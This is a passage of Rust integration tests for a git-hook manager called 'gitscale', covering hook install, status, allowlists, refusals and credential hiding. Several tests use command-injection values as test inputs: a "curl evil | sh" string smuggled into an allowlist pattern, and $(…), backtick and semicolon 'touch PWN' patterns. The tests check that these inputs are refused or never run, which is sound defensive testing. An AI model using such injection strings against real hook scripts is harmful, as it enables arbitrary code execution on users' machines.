/// same with a displaced one, rather than failing the checkout on it.
#[test]
fn edge_032_shim_skips_a_chained_hook_that_is_not_executable() {
    let env = TestEnv::new("hook_chain_not_executable");
    let repo = repo_with(&env, Some("[repos]\n"));
    std::fs::write(
        hooks_dir(&repo).join("post-checkout"),
        "#!/bin/sh\necho SHOULD-NOT-RUN\nexit 7\n",
    )
    .unwrap();
    assert!(cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]).success);
    assert!(!is_executable(
        &hooks_dir(&repo).join("post-checkout.local")
    ));

    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, Some("1"));
    assert_eq!(code, 0, "{}", output);
    assert!(output.trim().is_empty(), "{}", output);
}

/// A `--local` install writes `.git/hooks`, which git ignores once a global
/// `core.hooksPath` is set. The install does not say so (see the decisions in
/// the review); `hook status` is what shows it: the hooks directory git really
/// uses, and no gitscale hook in it. Pins current behaviour.
#[test]
fn edge_033_status_shows_a_global_hooks_path_that_hides_a_local_install() {
    let env = TestEnv::new("hook_local_hidden");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    let home = isolated_home(&env);
    let team = env.repos_remote.join("team-hooks");
    std::fs::create_dir_all(&team).unwrap();
    std::fs::write(
        home.join(".gitconfig"),
        format!("[core]\n\thooksPath = {}\n", team.display()),
    )
    .unwrap();

    let out = cli_isolated(&home, &["hook", "install", "--local", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(hooks_dir(&repo).join("post-checkout").is_file());

    let out = cli_isolated(&home, &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains(&format!("hooks    {}", team.display())),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout
            .lines()
            .any(|l| l.split_whitespace().collect::<Vec<_>>()
                == ["post-checkout", "not", "installed"]),
        "{}",
        out.stdout
    );
}

/// `hook status` reads the system and global settings from their own files —
/// what a test can point `GIT_CONFIG_SYSTEM` at, since `git config --system`
/// ignores `GIT_CONFIG_NOSYSTEM`. Read-only: nothing here installs at
/// `--system` scope.
#[test]
fn edge_034_status_reports_the_system_and_global_hooks_paths() {
    let env = TestEnv::new("hook_status_scopes");
    let repo = repo_with(&env, Some("[repos]\n"));
    let home = isolated_home(&env);
    let system = env.repos_remote.join("system-gitconfig");
    std::fs::write(&system, "[core]\n\thooksPath = /opt/system-hooks\n").unwrap();
    std::fs::write(
        home.join(".gitconfig"),
        "[core]\n\thooksPath = /opt/user-hooks\n",
    )
    .unwrap();

    let out = cli_isolated_with(
        &home,
        &[("GIT_CONFIG_SYSTEM", system.to_str().unwrap())],
        &["hook", "status", "-C", repo.to_str().unwrap()],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout
            .contains("system   core.hooksPath = /opt/system-hooks"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout
            .contains("global   core.hooksPath = /opt/user-hooks"),
        "{}",
        out.stdout
    );
}

/// Outside any repository `hook status` still reports the machine-wide
/// settings and says there is no repository, rather than failing.
#[test]
fn edge_035_status_outside_a_repository_says_so() {
    let env = TestEnv::new("hook_status_no_repo");
    let home = isolated_home(&env);
    let outside = tempfile::tempdir().unwrap();
    let out = cli_isolated(
        &home,
        &["hook", "status", "-C", outside.path().to_str().unwrap()],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout.contains("global   core.hooksPath unset"),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("Not inside a git repository."),
        "{}",
        out.stdout
    );
}

/// `hook run` re-checks the opt-in the shim makes: a repository with no
/// `.gitscale.toml` at its root gets no pull and no output.
#[test]
fn edge_036_run_in_a_repo_without_a_config_does_nothing() {
    let env = TestEnv::new("hook_run_no_config");
    repo_with(&env, None);
    let out = env.run_hook_run("post-checkout", "*", &[]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert_eq!(format!("{}{}", out.stdout, out.stderr).trim(), "");
    assert!(!breadcrumb(&env.playground).exists());
}

/// The patterns are written into a shell script. Shell syntax in one —
/// `$(…)`, backticks, `;` — must reach gitscale as the literal pattern and
/// never run.
#[test]
fn edge_037_allow_patterns_reach_gitscale_verbatim_and_never_run() {
    let env = TestEnv::new("hook_allow_metacharacters");
    let repo = repo_with(&env, Some("[repos]\n"));
    let spec = "github.com/$(touch PWN1)/*,`touch PWN2`,a;touch PWN3,${HOME}/x";
    let out = cli(&[
        "hook",
        "install",
        "--local",
        "--allow",
        spec,
        "-C",
        repo.to_str().unwrap(),
    ]);
    assert!(out.success, "stderr: {}", out.stderr);
    let shim = hooks_dir(&repo).join("post-checkout");
    let (bin, log) = fake_gitscale(&env.repos_remote);
    point_shim_at(&shim, &bin);

    let (code, output) = run_hook(&shim, &repo, None);
    assert_eq!(code, 0, "{}", output);
    assert_eq!(calls(&log).len(), 1, "{:?}", calls(&log));
    assert!(
        calls(&log)[0].ends_with(&format!("allow={}", spec)),
        "{:?}",
        calls(&log)
    );
    for pwn in ["PWN1", "PWN2", "PWN3"] {
        assert!(!repo.join(pwn).exists(), "{} was created", pwn);
    }
}

/// A `post_sync` the allowlist refuses is a failed hook pull like any other:
/// it leaves a breadcrumb, and `on_pull_error` decides — off CI the checkout
/// goes on, in CI it fails. The command never runs either way.
#[test]
fn edge_038_a_refused_post_sync_leaves_a_breadcrumb_and_follows_the_policy() {
    let env = support::workspace::hook_env(
        "hook_refused_post_sync",
        "https://gitlab.example.com/attacker/payload.git",
    );
    env.write_config("[hooks]\npost_sync = \"touch pwned\"\n");
    for (ci, fails) in [("", false), ("true", true)] {
        let _ = std::fs::remove_file(breadcrumb(&env.playground));
        let out = env.run_hook_run("post-checkout", "github.com/acme/*", &[("CI", ci)]);
        assert_eq!(!out.success, fails, "CI={:?}: {}", ci, out.stderr);
        assert!(
            out.stderr.contains("refusing to run the post_sync hook"),
            "{}",
            out.stderr
        );
        let note = std::fs::read_to_string(breadcrumb(&env.playground)).unwrap_or_default();
        assert!(
            note.contains("refusing to run the post_sync hook"),
            "{:?}",
            note
        );
        assert!(!env.playground.join("pwned").exists());
    }
}

/// A monorepo may commit its own copy of the shim and point `core.hooksPath`
/// at it; `hook status` already recognises such a copy. A `--local` install
/// there must not end up running gitscale twice on every checkout — once from
/// the displaced copy and again from the new shim.
#[test]
#[ignore = "bug: install displaces a repository's own gitscale copy and chains to it, so every checkout pulls twice"]
fn edge_039_install_beside_a_repositorys_own_copy_runs_gitscale_once() {
    let env = TestEnv::new("hook_vendored_double_run");
    let repo = repo_with(&env, Some("[repos]\n"));
    let root = repo.to_str().unwrap();
    let (bin, log) = fake_gitscale(&env.repos_remote);

    // The repository's own copy: a real shim, its marker swapped for its own
    // header, as edge_014 builds it.
    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    let vendored = repo.join(".githooks");
    std::fs::create_dir_all(&vendored).unwrap();
    for hook in ["post-checkout", "post-merge"] {
        let shim = std::fs::read_to_string(hooks_dir(&repo).join(hook)).unwrap();
        let copy: Vec<&str> = shim
            .lines()
            .map(|l| {
                if l.starts_with("# installed by gitscale") {
                    "# Delegate to the gitscale installed by the current environment."
                } else {
                    l
                }
            })
            .collect();
        std::fs::write(vendored.join(hook), copy.join("\n") + "\n").unwrap();
        point_shim_at(&vendored.join(hook), &bin);
    }
    assert!(cli(&["hook", "uninstall", "--local", "-C", root]).success);
    support::run_git_pub(&repo, &["config", "core.hooksPath", ".githooks"]);
    #[cfg(unix)]
    for hook in ["post-checkout", "post-merge"] {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(vendored.join(hook), std::fs::Permissions::from_mode(0o755))
            .unwrap();
    }

    assert!(cli(&["hook", "install", "--local", "-C", root]).success);
    point_shim_at(&vendored.join("post-checkout"), &bin);
    let (code, output) = run_hook(&vendored.join("post-checkout"), &repo, None);
    assert_eq!(code, 0, "{}", output);
    assert_eq!(
        calls(&log).len(),
        1,
        "gitscale ran {} times for one checkout: {:?}",
        calls(&log).len(),
        calls(&log)
    );
}

// ---------------------------------------------------------------------------
// Errors and refusals
// ---------------------------------------------------------------------------

#[test]
fn error_017_run_rejects_an_unknown_hook_name() {
    let env = TestEnv::new("hook_run_unknown");
    let repo = repo_with(&env, Some("[repos]\n"));
    let out = cli(&["hook", "run", "pre-rebase", "-C", repo.to_str().unwrap()]);
    assert!(
        !out.success,
        "expected failure for a hook gitscale never installs"
    );
    assert!(
        out.stderr.contains("unknown hook"),
        "stderr: {}",
        out.stderr
    );
}

/// A global install arms every clone on the machine, so it has to be told what
/// it may run. Guessing a default here is the bug this exists to prevent.
#[test]
fn error_018_install_global_requires_an_allowlist() {
    let env = TestEnv::new("hook_allow_global_required");
    let home = isolated_home(&env);

    let out = cli_isolated(&home, &["hook", "install", "--global"]);
    assert!(!out.success, "stdout: {}", out.stdout);
    assert!(
        out.stderr.contains("--allow is required"),
        "stderr: {}",
        out.stderr
    );
    assert!(
        !home.join(".config/gitscale/hooks").exists(),
        "a refused install must not leave hooks behind"
    );

    let out = cli_isolated(
        &home,
        &[
            "hook",
            "install",
            "--global",
            "--allow",
            "github.com/acme/*",
        ],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    assert_eq!(
        baked_allowlist(&home.join(".config/gitscale/hooks/post-checkout")),
        "github.com/acme/*"
    );
}

#[test]
fn error_019_install_refuses_a_pattern_that_would_break_the_shim() {
    let env = TestEnv::new("hook_allow_quote");
    let repo = repo_with(&env, Some("[repos]\n"));
    let out = cli(&[
        "hook",
        "install",
        "--local",
        "--allow",
        "a'; curl evil | sh; echo '",
        "-C",
        repo.to_str().unwrap(),
    ]);
    assert!(!out.success);
    assert!(
        out.stderr.contains("cannot be written into a hook script"),
        "stderr: {}",
        out.stderr
    );
}

/// A shim written before the allowlist existed passes no patterns. Running wide
/// open in that case would leave the hole in place across an upgrade.
#[test]
fn error_020_run_refuses_when_the_shim_passed_no_allowlist() {
    let env = TestEnv::new("hook_run_no_allowlist");
    let repo = repo_with(&env, Some("[repos]\n"));
    let out = cli(&["hook", "run", "post-checkout", "-C", repo.to_str().unwrap()]);
    assert!(!out.success);
    assert!(
        out.stderr.contains("installed by an older gitscale"),
        "stderr: {}",
        out.stderr
    );
}

/// A global `core.hooksPath` gitscale did not set belongs to somebody — a
/// team's shared hooks, say. Installing over it would silently disable them,
/// so the install refuses, and leaves the config and the hooks as they were.
#[test]
fn error_040a_install_global_refuses_a_foreign_core_hooks_path() {
    let env = TestEnv::new("hook_global_foreign_path");
    let home = isolated_home(&env);
    let team = env.repos_remote.join("team-hooks");
    write_script(&team.join("post-checkout"), "echo team\n");
    let config = format!("[core]\n\thooksPath = {}\n", team.display());
    std::fs::write(home.join(".gitconfig"), &config).unwrap();

    let out = cli_isolated(&home, &["hook", "install", "--global", "--allow", "*"]);
    assert!(!out.success, "stdout: {}", out.stdout);
    assert!(
        out.stderr.contains("refusing to replace it (use --force)"),
        "{}",
        out.stderr
    );
    assert_eq!(
        std::fs::read_to_string(home.join(".gitconfig")).unwrap(),
        config
    );
    assert!(!home.join(".config/gitscale/hooks").exists());
}

/// With `--force` the install replaces the foreign `core.hooksPath`, leaving
/// the directory it named alone. A later uninstall unsets `core.hooksPath`
/// rather than restoring the old value — current behaviour, pinned here and
/// listed for the owner to decide.
#[test]
fn error_040b_install_global_with_force_replaces_a_foreign_core_hooks_path() {
    let env = TestEnv::new("hook_global_foreign_path_force");
    let home = isolated_home(&env);
    let team = env.repos_remote.join("team-hooks");
    write_script(&team.join("post-checkout"), "echo team\n");
    std::fs::write(
        home.join(".gitconfig"),
        format!("[core]\n\thooksPath = {}\n", team.display()),
    )
    .unwrap();

    let out = cli_isolated(
        &home,
        &["hook", "install", "--global", "--force", "--allow", "*"],
    );
    assert!(out.success, "stderr: {}", out.stderr);
    let managed = home.join(".config/gitscale/hooks");
    let get = git_ok(
        &home,
        &env.playground,
        &["config", "--global", "--get", "core.hooksPath"],
    );
    assert_eq!(get.trim(), managed.to_str().unwrap());
    assert_eq!(
        std::fs::read_to_string(team.join("post-checkout")).unwrap(),
        "#!/bin/sh\necho team\n"
    );

    assert!(cli_isolated(&home, &["hook", "uninstall", "--global"]).success);
    let get = git_as(
        &home,
        &env.playground,
        &["config", "--global", "--get", "core.hooksPath"],
    );
    assert!(
        !get.status.success(),
        "pinned: uninstall unsets core.hooksPath instead of restoring {}",
        team.display()
    );
}

/// A hook already displaced to `<name>.local` is somebody's: a second foreign
/// hook would overwrite it. The install refuses, and writes nothing.
#[test]
fn error_041a_install_refuses_to_overwrite_a_displaced_hook() {
    let env = TestEnv::new("hook_displaced_exists");
    let repo = repo_with(&env, Some("[repos]\n"));
    write_script(&hooks_dir(&repo).join("post-checkout"), "echo new\n");
    write_script(&hooks_dir(&repo).join("post-checkout.local"), "echo old\n");

    let out = cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]);
    assert!(!out.success, "stdout: {}", out.stdout);
    assert!(
        out.stderr
            .contains("already exists; refusing to overwrite it (use --force)"),
        "{}",
        out.stderr
    );
    assert_eq!(
        std::fs::read_to_string(hooks_dir(&repo).join("post-checkout")).unwrap(),
        "#!/bin/sh\necho new\n"
    );
    assert_eq!(
        std::fs::read_to_string(hooks_dir(&repo).join("post-checkout.local")).unwrap(),
        "#!/bin/sh\necho old\n"
    );
    assert!(!hooks_dir(&repo).join("post-merge").exists());
}

/// With `--force` the hook in place is displaced over the older `.local`,
/// which is lost — what `--force` is documented to do.
#[test]
fn error_041b_install_with_force_displaces_over_an_older_displaced_hook() {
    let env = TestEnv::new("hook_displaced_exists_force");
    let repo = repo_with(&env, Some("[repos]\n"));
    write_script(&hooks_dir(&repo).join("post-checkout"), "echo new\n");
    write_script(&hooks_dir(&repo).join("post-checkout.local"), "echo old\n");

    let out = cli(&[
        "hook",
        "install",
        "--local",
        "--force",
        "-C",
        repo.to_str().unwrap(),
    ]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert_eq!(
        std::fs::read_to_string(hooks_dir(&repo).join("post-checkout.local")).unwrap(),
        "#!/bin/sh\necho new\n"
    );
    let (code, output) = run_hook(&hooks_dir(&repo).join("post-checkout"), &repo, Some("1"));
    assert_eq!(code, 0);
    assert_eq!(output.trim(), "new");
}

/// A refused install leaves every hook as it found it — including the ones
/// it would have handled before reaching the one that made it refuse.
#[test]
#[ignore = "bug: a .local collision on post-merge is found after post-checkout was already displaced and rewritten"]
fn error_042_a_refused_install_leaves_every_hook_untouched() {
    let env = TestEnv::new("hook_refused_partial");
    let repo = repo_with(&env, Some("[repos]\n"));
    write_script(&hooks_dir(&repo).join("post-checkout"), "echo mine\n");
    write_script(&hooks_dir(&repo).join("post-merge"), "echo new\n");
    write_script(&hooks_dir(&repo).join("post-merge.local"), "echo old\n");

    let out = cli(&["hook", "install", "--local", "-C", repo.to_str().unwrap()]);
    assert!(!out.success, "stdout: {}", out.stdout);
    assert_eq!(
        std::fs::read_to_string(hooks_dir(&repo).join("post-checkout")).unwrap(),
        "#!/bin/sh\necho mine\n",
        "post-checkout was replaced by a refused install"
    );
    assert!(!hooks_dir(&repo).join("post-checkout.local").exists());
}

/// An `origin` can carry credentials — older GitLab runners check out with the
/// job token in the URL. `hook status` names the repository by host and path
/// and never prints them.
#[test]
fn error_043_status_never_prints_credentials_from_the_origin() {
    let env = TestEnv::new("hook_status_userinfo");
    let repo = repo_with(&env, Some("[repos]\n"));
    support::run_git_pub(
        &repo,
        &[
            "remote",
            "add",
            "origin",
            "https://gitlab-ci-token:S3CRET-TOKEN@gitlab.example.com/acme/app.git",
        ],
    );
    let root = repo.to_str().unwrap();
    assert!(
        cli(&[
            "hook",
            "install",
            "--local",
            "--allow",
            "github.com/*",
            "-C",
            root
        ])
        .success
    );

    let out = cli_isolated(&isolated_home(&env), &["hook", "status", "-C", root]);
    assert!(out.success, "stderr: {}", out.stderr);
    assert!(
        out.stdout
            .contains("gitlab.example.com/acme/app — NOT allowed"),
        "{}",
        out.stdout
    );
    assert!(
        !format!("{}{}", out.stdout, out.stderr).contains("S3CRET-TOKEN"),
        "{}",
        out.stdout
    );
}

// ---------------------------------------------------------------------------
// Performance
// ---------------------------------------------------------------------------

/// One clone runs gitscale once. The pull it starts checks out every declared
/// repository with git, which fires the same global hook in each — and each
/// carries a `.gitscale.toml` here, so only the recursion guard stops that
/// from recursing.
#[test]
fn perf_044_a_hooked_clone_runs_gitscale_exactly_once() {
    let env = TestEnv::new("hook_clone_once");
    let home = isolated_home(&env);
    let lib = env.create_bare_repo(
        "lib",
        "main",
        &[("a.txt", "from lib"), (".gitscale.toml", "[repos]\n")],
    );
    let root = env.create_bare_repo(
        "root",
        "main",
        &[
            (
                ".gitscale.toml",
                &format!(
                    "[repos]\n\"libs/lib\" = {{ url = \"{}\", revision = \"main\" }}\n",
                    lib.display()
                ),
            ),
            (".gitignore", "/libs/\n"),
        ],
    );
    assert!(cli_isolated(&home, &["hook", "install", "--global", "--allow", "*"]).success);

    // Count every call the shims make, then hand over to the real binary.
    let log = env.repos_remote.join("calls.log");
    let wrapper = env.repos_remote.join("counting-gitscale");
    write_script(
        &wrapper,
        &format!(
            "echo \"$*\" >> '{}'\nexec '{}' \"$@\"\n",
            log.display(),
            env!("CARGO_BIN_EXE_gitscale")
        ),
    );
    for hook in ["post-checkout", "post-merge"] {
        point_shim_at(&home.join(".config/gitscale/hooks").join(hook), &wrapper);
    }

    let clone = env.repos_remote.join("clone");
    let report = git_ok(
        &home,
        &env.repos_remote,
        &[
            "clone",
            "-q",
            root.to_str().unwrap(),
            clone.to_str().unwrap(),
        ],
    );
    assert!(clone.join("libs/lib/a.txt").is_file(), "{}", report);
    assert_eq!(
        calls(&log).len(),
        1,
        "gitscale ran {:?} for one clone",
        calls(&log)
    );
}
